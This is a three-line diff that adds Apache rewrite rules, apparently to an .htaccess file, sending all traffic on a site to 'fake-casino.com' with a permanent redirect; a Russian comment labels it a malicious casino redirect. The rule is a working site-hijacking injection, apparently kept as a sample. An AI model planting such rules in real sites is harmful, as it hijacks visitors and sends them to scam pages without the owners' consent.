@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteRule ^(.*)$ http://fake-casino.com/$1 [R=301,L]
+# Это вредоносный редирект на казино
